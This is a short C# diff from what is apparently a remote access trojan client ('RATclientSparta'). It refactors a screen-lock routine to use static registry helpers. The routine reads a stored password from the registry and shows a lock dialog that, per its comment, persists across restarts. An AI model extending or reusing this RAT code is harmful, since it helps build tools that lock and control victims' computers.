@@ -13,12 +13,10 @@ namespace RATclientSparta.Tools.Screen
         public void CheckIfLockRequired()
         {
             //Feature that locks the computer, Its using registry, So it will work even after computer restart.
-            RegistryCheck check = new RegistryCheck();
-            if (check.CheckIfExist("ScreenLock"))
+            if (RegistryCheck.CheckIfExist("ScreenLock"))
             {
-                RegistryGet get = new RegistryGet();
                 //Decoding the password
-                string password = get.Get(@"HKEY_CURRENT_USER\Software\ClientValues", "ScreenLock");
+                string password = RegistryGet.Get(@"HKEY_CURRENT_USER\Software\ClientValues", "ScreenLock");
                 ScreenLock ScreenLock = new ScreenLock(password);
                 ScreenLock.ShowDialog();
             }
